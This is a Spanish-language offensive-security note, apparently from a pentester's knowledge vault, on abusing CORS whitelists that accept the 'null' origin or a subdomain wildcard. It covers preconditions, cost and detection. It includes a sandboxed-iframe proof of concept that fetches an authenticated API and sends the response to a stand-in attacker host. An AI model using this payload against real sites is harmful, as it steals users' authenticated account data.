---
tipo: tradecraft
clase: "[[CWE-942 - Permissive Cross-domain Policy with Untrusted Domains]]"
eje: validacion-del-origen
implementacion: "Forzar el Origin null desde un contexto sandbox, o abusar un subdominio cuando la lista usa comodín"
opsec: ruidoso
telemetria: ["[[Log de acceso del servidor web]]"]
requisitos: [null-en-lista-blanca-o-comodin-de-subdominio, allow-credentials-true]
coste: medio
alternativas: ["[[CORS - reflejo del origen con credenciales]]", "[[CORS - validación por subcadena]]"]
probado: nunca
contexto: [web-generica]
aliases:
  - CORS null origin
  - subdomain wildcard
tags:
  - dominio/web
---

# CORS - null y comodín de subdominio

## Cuándo lo elijo

Dos situaciones que no se parecen entre sí pero comparten que la lista blanca es correcta salvo por un valor de más.

**`null`**: cuando la validación es por lista exacta —así que las ramas de reflejo y subcadena están cerradas— pero la lista **incluye `null`**. Se confirma mandando `Origin: null` y viendo si se refleja.

**Comodín de subdominio**: cuando la lista acepta `*.objetivo.com` y hay algún subdominio bajo control —por toma de subdominio, por un XSS en cualquiera de ellos, o por un servicio de terceros alojado ahí.

Van juntas en una nota porque las dos son "la lista está bien salvo por una entrada", y las dos se prueban después de descartar las variantes de cadena.

## Por qué funciona

**El origen `null`** lo produce el navegador en varios contextos, y el atacante puede forzar el que le sirve: una petición desde un `iframe` con `sandbox`, desde un documento abierto con `data:`, o desde una redirección con esquema local. La entrada `null` aparece en las listas blancas porque durante el desarrollo, al probar desde el sistema de archivos, el navegador manda `null` y alguien lo agregó "para que ande" y no lo sacó.

```html
<iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
<script>
fetch('https://objetivo.com/api/cuenta',{credentials:'include'})
 .then(r=>r.text()).then(d=>location='https://atacante.com/x?'+encodeURIComponent(d))
</script>"></iframe>
```

El `iframe` con `sandbox` sin `allow-same-origin` hace que la petición salga con `Origin: null`, que la lista autoriza.

**El comodín de subdominio** funciona porque `*.objetivo.com` confía en todo lo que cuelgue del dominio, y esa confianza es tan fuerte como el subdominio más débil. Un solo subdominio comprometido —o un `staging`, un `dev`, un servicio de terceros— alcanza para tener un origen autorizado. Es la misma superficie que abusan [[CORS - validación por subcadena]] en su variante de prefijo, [[CSRF - double submit y cookie inyectada]] y [[OAuth - redirect_uri mal validado]] con comodín: conviene enumerar los subdominios una vez y reusar el resultado en los cuatro dominios.

## Cómo falla

El caso `null` falla cuando la lista blanca no lo incluye, que es lo correcto y lo que hay que recomendar: **nunca autorizar `null`**, porque no identifica a nadie.

El comodín falla cuando la lista es de orígenes exactos sin comodín, o cuando no hay ningún subdominio bajo control ni se puede tomar uno. Esa segunda condición es la que más veces cierra la rama: el comodín está, pero conseguir un origen dentro de él es un trabajo de reconocimiento que puede no dar nada.

Las dos fallan sin `Access-Control-Allow-Credentials`, como toda la familia.

## Coste

Medio, y muy distinto entre las dos variantes.

El `null` es barato: se confirma con una petición y la prueba de concepto es el `iframe` de arriba, sin registrar nada ni comprometer nada. Cuando la lista incluye `null`, es de los hallazgos más limpios del dominio.

El comodín es caro: confirmar que acepta `*.objetivo.com` es una petición, pero explotarlo depende de conseguir el subdominio, que es una cadena aparte —toma de subdominio o XSS— y puede costar más que todo el resto del dominio.

## Huella esperada

Igual que el resto del dominio, la señal es una cabecera `Origin` que depende de instrumentación que por defecto no está.

El caso `null` tiene una particularidad defensiva que conviene anotar: **`Origin: null` sobre un endpoint autenticado no tiene explicación legítima** en tráfico normal de usuario, así que sería una firma de alta fidelidad si se registrara. Es análogo a por qué [[Petición al servicio de metadatos de instancia]] es tan fiable: ancla en algo que no pasa por accidente.

El comodín es lo contrario: el ataque llega desde un subdominio real del objetivo, así que el `Origin` es legítimo y no hay nada anómalo en él. Esa variante solo se detecta desde el subdominio comprometido, no desde el flujo de CORS.

Ninguna de las dos tiene detección en el vault, por el mismo motivo de fuente que las otras ramas. Todo el dominio comparte ese hueco de instrumentación, documentado en [[MOC - CORS]].
